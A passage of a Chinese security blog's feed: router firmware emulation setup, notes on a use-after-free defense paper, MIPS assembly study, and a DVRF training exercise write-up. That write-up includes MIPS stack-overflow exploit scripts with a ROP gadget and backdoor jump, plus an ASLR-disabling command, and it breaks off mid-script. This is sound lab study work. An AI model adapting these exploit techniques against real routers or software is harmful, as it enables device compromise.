href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410091837720.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410091837720.png" alt="image.png"></a><br>libc.so.0和libc.so.6是不同版本的c标准库 数字的区别在于版本号<br>这里直接更改名字 将libc.so.0复制一份并且修改为libc.so.6即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv ./lib/libc.so.0 ./lib/libc.so.6</span><br></pre></td></tr></table></figure><p>可以看到这时候没有报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092109700.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092109700.png" alt="image.png"></a><br>但是这里fopen打开的文件目录显然不存在  所以自己创建目录后成功运行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092126282.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092126282.png" alt="image.png"></a><br>还需要用到nvram.ini文件 在项目中有提到<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092127111.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410092127111.png" alt="image.png"></a><br>按照下面这样配置nvram.ini</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=127.0.0.1</span><br><span class="line">hwver=R6400</span><br><span class="line">friendly_name=R6400</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><p>随后成功运行<br>环境搭建到这里就结束了 有一点疑惑的是查看的教程还需要&#x2F;lib&#x2F;libdl.so.0 但是本人没有遇到这个报错</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>PUMM论文阅读</title>
    <link href="http://example.com/2024/09/08/pumm%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <id>http://example.com/2024/09/08/pumm%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</id>
    <published>2024-09-08T08:36:46.000Z</published>
    <updated>2024-09-19T12:50:25.816Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>以往针对UAF和double free的防御方法 所采用的办法是推迟内存重新分配的时间<br>这种解决方法存在运行时和内存开销过大的问题<br>作者提出的解决方法为  对程序进行刨析 将不同任务的代码单元分割开 这样不同单元之间的数据互通就极少  内存的重新分配可以等到单元执行完毕后  这样就有效避免了UAF<br>于是设计了一款以linux为原型的 称之为PUMM 由离线的代码分析器和在线执行器组成</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>UAF可能导致程序崩溃和拒绝服务攻击(DOS)<br>甚至有可能导致任意代码执行  攻击者可以伪造缓冲区 触发UAF使程序将该缓冲区当成原始代码指针 从而劫持程序执行流<br>原理就是程序释放了内存后 攻击者仍然保留这块内存的指针 当这块内存被重新分配时 攻击者就可以篡改目标地址的内容<br>所以研究人员一开始的防御思路是设计内存分配器 以推迟内存重新分配的时间 当攻击者无法用新的内存对象覆盖以前的内存对象 就可以避免UAF<br>近年来 出现了两种方案(扫描和一次性分配)<br>扫描方法在内存释放后 会对其进行隔离 当验证不存在对该内存仍可利用的指针后 才会重新分配<br>一次性分配(OTA)方法则是不会重新分配内存<br>这两种方法虽然可以有效防止UAF 但是扫描方法会因为误报从而过度隔离内存 一次性分配会消耗过多的虚拟内存 从而加大内存开销<br>基于EUP 作者认为可以在执行单元上实行OTA 这样执行单元在新迭代开始时就会被释放 不会出现常规OTA所造成的虚拟地址空间耗尽<br>这一方案的第一个难点在于如何在缺乏源代码的程序中识别需要延迟进行重新分配的执行单元 于是作者提出了⼀种基于离线动态分析的技术来检测一个执行单元的外循环指示<br>这里要注意  EUP采取的是运行时行为来检测单元 而作者采取的是审计日志来检测单元<br>接下来的任务就是将识别到的单元转化为有效可执行的内存分配器的隔离策略<br>作者采取了一种算法来精确的定位程序中的释放点 通过识别执行单元开始前发生的内存管理器函数的调用者 来允许单元每次新迭代开始时安全的释放之前隔离的地址</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409191108734.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409191108734.png" alt="image.png"></a><br>如图所示 提供了一个代码示例<br>该代码存在UAF漏洞 代码主体逻辑为以行为单位读取文件中的内容 如果getline函数中的realloc没有开辟成功下一行的空间 那么此时的指针r就仍然指向上一行 但是上一行的空间已经被释放了 此时就得到了一个空置指针 进行了二次free<br>PUMM如何分析这个程序 在脱机阶段 通过测试数据的输入来分析程序的执行轨迹 会显示出一张控制流图(CFG)<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409192030758.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409192030758.png" alt="image.png"></a><br>针对上面的案例  PUMM检测到了四个简单周期(基本电路) 而橙色周期的头部支配其他周期的头部 所以他们合并成一个执行单元(用紫色表示)<br>这个执行单元的头部 也就是刚才的橙色周期 也是这个执行单元的最外层循环 这是有一定联系的  我们标识的单元具备了自主处理一个输入的所有代码<br>下一步 PUMM会定位内存分配器函数的调用者 并检测是否有属于某个单元的调用者<br>PUMM将这个调用者记录在安全配置文件中 当程序到达这个调用者 就代表执行单元新的迭代开启 就不会再访问上一次迭代的内存地址 同时 上一次迭代的悬空指针都将作废<br>在任何情况下 PUMM会加载安全配置文件 内存管理器函数调用的内存地址都会被隔离 同时之前隔离的内存将会被释放<br>这种方法仍然无法避免UAF 但是UAF访问的非法地址被隔离 所以无法访问</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>2024CISCN华东南分区赛</title>
    <link href="http://example.com/2024/06/26/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
    <id>http://example.com/2024/06/26/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/</id>
    <published>2024-06-26T12:40:51.000Z</published>
    <updated>2024-06-26T12:43:57.487Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="cJSON"><a href="#cJSON" class="headerlink" title="cJSON"></a>cJSON</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>MIPS架构学习</title>
    <link href="http://example.com/2024/02/27/mips%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/02/27/mips%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-02-27T07:47:06.000Z</published>
    <updated>2024-10-10T02:52:20.624Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gcc-mips-linux-gnu gcc-mipsel-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64</span><br></pre></td></tr></table></figure><h1 id="编译及运行"><a href="#编译及运行" class="headerlink" title="编译及运行"></a>编译及运行</h1><p>MIPS架构 其也包括大小端序 32位和64位<br>32位小端序 mipsel<br>32位大端序 mips<br>64位小端序 mips64el<br>64位大端序 mips64<br>用如下所示代码编译一个32位小端序的二进制文件 并尝试使用qemu模拟运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdint.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 2, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    init();</span><br><span class="line">    printf(&quot;%s&quot;,&quot;test\n&quot;);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(0,buf,0x30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mipsel-linux-gnu-gcc -o test test.c</span><br></pre></td></tr></table></figure><p>qemu模拟运行指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mipsel-static -L /usr/mipsel-linux-gnu/ ./test</span><br></pre></td></tr></table></figure><h1 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h1><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>这里以o32 abi接口标准为主<br>其约定的寄存器如下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402271658263.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402271658263.png" alt="image.png"></a><br>此外 MIPS架构还强制要求协处理器 最多可以拥有4个<br>固定拥有协处理器cp0<br>其功能包括CPU配置 Cache控制 异常、中断控制 中断或异常发生时的行为和处理的定义 内存管理单元控制等等<br>协处理器cp0一共包括32个寄存器 这里挑选几个比较重要的寄存器来记忆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sr 状态寄存器 可以反应cpu的状态以及控制cpu</span><br><span class="line">$lo $hi 整数乘除法寄存器 只用来存放整数乘除法运算的结果 前者存放商 后者存放余数</span><br><span class="line">$pc 程序计数器 标志着当前要执行的指令 类似于x86架构中的eip</span><br><span class="line">$f0-$f31 浮点数寄存器</span><br></pre></td></tr></table></figure><h2 id="读懂简单的程序汇编"><a href="#读懂简单的程序汇编" class="headerlink" title="读懂简单的程序汇编"></a>读懂简单的程序汇编</h2><p>这里通过上面编译出来的32位小端序程序来逐行分析汇编<br>以main函数为例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071258753.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071258753.png" alt="image.png"></a><br>addiu和addi功能相同 为左侧操作数加上右侧的立即数 不过addiu并不会检测溢出<br>$sp指向栈顶 这里抬高栈顶 为后续操作腾出栈空间<br>sw(store word)将寄存器的值保存到某地址 这里将返回地址保存到$sp+0x40+0x4处<br>下一行将栈底指针保存到$sp+0x40处<br>move指令用于寄存器值之间的传递 这里使$fp&#x3D;$sp 将栈底指针也抬高到栈顶处<br>前面这些操作类似于x64架构中的初始化栈帧空间以及保存返回地址以便返回到上一个执行语句<br>li(load immediate)将立即数赋值给寄存器 这里把0x419010传给$gp 顺带下一句把$gp的值保存到了$sp+0x40-0x30处<br>la(load address)将地址赋值给寄存器<br>lw(load word)将某地址内的值赋值给寄存器<br>__stack_chk_guard的地址也为0x4110a0 这两句组合起来就相当于将canary的值赋值给v0寄存器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071342441.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071342441.png" alt="image.png"></a><br>接着用sw 将v0的值存储到$fp+0x40-0x4中<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071356771.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403071356771.png" alt="image.png"></a><br>红框圈起来的是该语句写入的canary 而你会发现 这里实际上是往$s8+0x3c处写入 而不是$fp<br>查阅了cyberangle师傅的博客后 得知对于gdb来说 对于$fp的操作就等于对于$s8操作<br>上面没提及的是 $fp是30号寄存器 根据编译器的不同 30号寄存器也可以看作是$s8<br>在介绍jal汇编指令之前 需要引入两个概念 叶子函数和非叶子函数<br><strong>叶子函数: 该函数中不会再调用其他函数</strong><br><strong>非叶子函数: 该函数中会调用其他函数</strong><br>这里以另外一个程序为例来观察二者的区别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void vuln()&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    vuln();</span><br><span class="line">    puts(&quot;exit&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了排除开启canary保护加入的stack_fail_check函数带来的影响 这里选择关闭canary保护<br>此时按照上面的理念 可以判断出main函数调用了vuln和printf属于非叶子函数 vuln函数为叶子函数<br>先来看非叶子函数main<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181918987.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181918987.png" alt="image.png"></a><br>首先 抬栈腾出栈帧空间 随后往栈上保存返回地址和栈底指针 迁移sp指针至fp指针<br>随后跳转执行vuln函数<br>再来看叶子函数vuln<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181944412.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403181944412.png" alt="image.png"></a><br>可以明显看到 叶子函数并没有将$ra寄存器的值存放到栈上 这是因为非叶子函数需要调用到其他函数 所以将返回地址暂存到栈上 而叶子函数不必考虑这一点<br>那么说回到jal指令 其将对应函数的地址载入ra寄存器 随后nop滑动执行函数<br>接着以test程序的main函数来分析 看一下puts函数是如何调用的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403182025876.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403182025876.png" alt="image.png"></a><br>先把之前存到栈上的gp寄存器值重新赋值给寄存器<br>lui(load upper immediate) 取立即数存到寄存器的高16位 低16位用0填充<br>此时v0寄存器为0x00400000<br>aTest指向存放于rodata段的test字符串 此时的addiu相当于 a0&#x3D;v0+(aTest-0x400000)<br>随后将puts函数的地址存放到t9寄存器中<br>jarl和jal指令的区别在于 前者会多一个存放返回地址的功能<br>其有两种格式  jalr opt1 opt2 和jalr opt1<br>当为前者时 返回地址存入opt2 为后者时 返回地址存入ra寄存器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221026926.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221026926.png" alt="image.png"></a><br>分析一下 像read这类需要多参数的函数如何处理<br>可以看到三个参数是用寄存器$a0-$a2存储 不同于i386架构的32位是利用栈来传参<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221035890.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403221035890.png" alt="image.png"></a><br>最后来看开启了canary保护的栈帧是如何结束的<br>重点在于beq指令 如果$v1(也就是栈上的canary)和$v0相等<br>那么就跳转到loc_400920 否则调用stack_chk_fail函数来输出报错以及终止程序<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403281138947.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403281138947.png" alt="image.png"></a><br>栈帧末尾 清空了v0寄存器 使其为0 和i386架构类似 后者把eax寄存器用于存储函数返回值<br>随后把$sp挪到$fp所指向的地址 也就是最开始$sp抬高栈帧后的地址<br>随后取回放在栈上的$ra和$fp<br>一开始把$sp往低地址移动了0x48字节 在结束后将$sp放回去<br>随后跳转回到$ra中存储的返回地址</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>DVRF项目学习</title>
    <link href="http://example.com/2024/02/25/dvrf%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/02/25/dvrf%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-02-25T03:31:19.000Z</published>
    <updated>2024-09-07T03:24:02.930Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Damn Vulnerable Router Firmware (DVRF)是一个帮助了解x86&#x2F;64以外架构的项目 支持qemu模拟搭建环境<br>项目地址 <a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/praetorian-inc/DVRF.git</span><br></pre></td></tr></table></figure><p>下载项目后 使用binwalk分解出文件系统</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me DVRF_v03.bin 该文件位于Firmware文件夹中</span><br></pre></td></tr></table></figure><p>所涉及到的漏洞文件位于pwnable文件夹中</p><h1 id="stack-bof-01"><a href="#stack-bof-01" class="headerlink" title="stack_bof_01"></a>stack_bof_01</h1><p>先来看这个文件 readelf查看架构  发现是mips<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251155344.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251155344.png" alt="image.png"></a><br>尝试使用qemu模拟运行一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot  . ./qemu-mipsel-static  ./pwnable/Intro/stack_bof_01</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251255367.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251255367.png" alt="image.png"></a><br>需要在程序后面跟上参数 随便带一个aaaa试试<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251257464.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202402251257464.png" alt="image.png"></a><br>应该是有一个空间存放输入的字符串 加上打印出了字符串 猜测可能存在溢出的情况 使用ida打开程序看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v4; // [sp+18h] [+18h] BYREF</span><br><span class="line">  char v5[198]; // [sp+1Ah] [+1Ah] BYREF</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  memset(v5, 0, sizeof(v5));</span><br><span class="line">  if ( argc &lt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Welcome to the first BoF exercise!\r\n\r&quot;);</span><br><span class="line">  strcpy((char *)&amp;v4, argv[1]);</span><br><span class="line">  printf(&quot;You entered %s \r\n&quot;, (const char *)&amp;v4);</span><br><span class="line">  puts(&quot;Try Again\r&quot;);</span><br><span class="line">  return 65;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析一下main函数 开始对于argc参数进行了判断 其用来表示程序外部输入参数的个数<br>初始值为1 即运行程序的指令 如果我们后续再跟入一个参数 即可以跳过if分支<br>接下来使用strcpy函数将输入的参数复制到v4数组中 没有对写入的字节数进行限制 这里就存在栈溢出<br>同时还存在dat_shell函数 通过执行该函数 可以直接获取shell<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301626746.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301626746.png" alt="image.png"></a><br>通过对mips架构的程序了解 返回地址存储在栈上 在栈帧结束后 通过$ra寄存器进行跳转<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301635598.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301635598.png" alt="image.png"></a><br>比对strcpy函数和最后的$ra寄存器值 大致可以推测出偏移为0xcc 准备利用动调来测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addiu   $v0, $fp, 0xE0+var_C8</span><br><span class="line"></span><br><span class="line">lw      $ra, 0xE0+var_s4($sp)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot  . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01</span><br></pre></td></tr></table></figure><p>可以看到偏移就为0xcc 此时我们在垃圾数据后加上漏洞函数的地址 看是否能够劫持程序执行流<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301643411.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301643411.png" alt="image.png"></a><br>编写exp脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch = &quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0xcc + &#x27;\x50&#x27;+&#x27;\\&#x27;+&#x27;\x09\x40&#x27;</span><br><span class="line"></span><br><span class="line">io = process(&quot;qemu-mipsel-static -L ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/ -g 2222 ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01 &quot;+payload,shell=True)</span><br><span class="line">elf = ELF(&quot;./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>虽然此时已经劫持了返回地址 但是会发现程序卡在了这句<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301756554.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301756554.png" alt="image.png"></a><br>查阅了其他师傅的博客后 发现问题出在了t9这个寄存器上<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301757914.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202403301757914.png" alt="image.png"></a><br>如图 dal_shell函数中调用的每个函数的参数都由$t9来索引 为了成功调用函数<br>我们还需要控制t9的值 t9的值默认为当前函数开始的地址<br>接下来的问题在于如何控制t9寄存器<br>利用ropper查询一下gadget 漏洞文件中未发现 查看一下libc文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ropper -f libc.so.0 --search &quot;lw $t9&quot;</span><br></pre></td></tr></table></figure><p>以sp寄存器为索引的地址相对来说更好控制 可以在栈溢出的时候顺便设置 这里的两句都可以使用<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072114740.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072114740.png" alt="image.png"></a><br>随后关闭aslr 来减小我们做题的难度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>但是在查询libc基址的时候发现  vmmap无法显示出来地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072257376.png" title="e59c768b79190538edb1c9f4ab494194.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404072257376.png" alt="e59c768b79190538edb1c9f4ab494194.png"></a><br>于是打算利用memset中的got表来获取真实地址<br>断点打在执行memset函数后<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171355050.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171355050.png" alt="image.png"></a><br>得到memset的真实地址 打开libc文件 查得偏移为0x1BE10<br>计算得到libc基址<br>那么就可以得到lw $t9该条gadget的地址了<br>往对应的位置填入后门函数的起始地址赋值给$t9 成功执行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171400209.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171400209.png" alt="image.png"></a><br>完整exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch = &quot;mips&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = 0x3fee5000</span><br><span class="line">t9 = 0x00021278+libc_base #0x3ff11ff4</span><br><span class="line"></span><br><span class="line">#payload = &quot;a&quot;*0xcc + &#x27;\xf4\x1f\xf1\x3f&#x27; + &#x27;\x50&#x27;+&#x27;\\&#x27;+&#x27;\x09\x40&#x27;</span><br><span class="line">payload = b&quot;a&quot;*0xcc + p32(t9)+b&#x27;\x50&#x27;+b&#x27;\\&#x27;+b&#x27;\x09\x40&#x27;+cyclic(0x3d)+b&#x27;\x50&#x27;+b&#x27;\\&#x27;+b&#x27;\x09\x40&#x27;</span><br><span class="line"></span><br><span class="line">io = process(b&quot;qemu-mipsel-static -L ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/ -g 1111 ./DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/stack_bof_01 &quot;+payload,shell=True)</span><br><span class="line">elf = 